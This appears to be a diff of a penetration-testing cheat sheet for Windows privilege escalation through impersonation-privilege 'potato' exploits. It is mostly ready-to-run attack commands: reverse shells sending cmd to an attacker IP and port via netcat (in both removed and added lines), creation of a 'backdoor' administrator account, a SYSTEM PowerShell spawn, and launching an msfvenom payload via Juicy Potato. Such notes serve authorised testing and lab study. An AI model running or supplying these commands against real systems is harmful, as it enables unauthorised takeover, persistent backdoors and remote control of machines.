@@ -4,39 +4,54 @@ Confirm  Piv
 whoami /all
 ```
 
-Tools we can  use 
-
- - PrintSpoofer
- - GodPotato
+we need the `SeImpersonatePrivilege Enabled`
 
 
-```sh
-nc -lvnp 5555
+**God Potato**
 
-iwr -uri "https://github.com/int0x33/nc.exe/blob/master/nc64.exe/" -Outfile nc64.exe
+ https://github.com/BeichenDream/GodPotato
+
+This is the best potato and can also be use to add an Administrator user when a shell is unstable
 
 ```
-
-download the exploit method 1
-```sh
-https://github.com/itm4n/PrintSpoofer/releases
-```
-
-execute exploit
-```sh
-PrintSpoofer64.exe -c "C:\TEMP\ncat.exe $IP  $PORT -e cmd"
+GodPotato -cmd "net user /add backdoor Password123"
+GodPotato -cmd "net localgroup administrators /add backdoor"
 ```
 
 
+**PrintSpoofer**
 
-download the exploit method 2
-```sh
-https://github.com/BeichenDream/GodPotato/releases
+https://github.com/itm4n/PrintSpoofer
+
+```
+PrintSpoofer.exe -i -c powershell.exe
 ```
 
-execute
-```sh
-#ne35 depends on the .net version
-.\GodPotato-NET35.exe -cmd "C:\TEMP\nc64.exe $IP $PORT -e cmd "
+
+**SweetPotato**
+
+ [https://github.com/carr0t2/SweetPotato/releases/tag/v1.0.0
+
+```
+.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc64.exe -a "<ip> <port> -e cmd"
 ```
 
+
+
+**Juicy Potato**
+
+1. Get a shell.exe ready from msfvenom
+    
+2. Use the port used in shell.exe and get CLSID from [https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
+    
+
+```
+jp.exe -l 8000 -p C:\Users\Public\shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+```
+
+
+**Hot Potato**
+
+```
+.\potato.exe -ip <attacker ip> -cmd "C:\Path\to\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+```
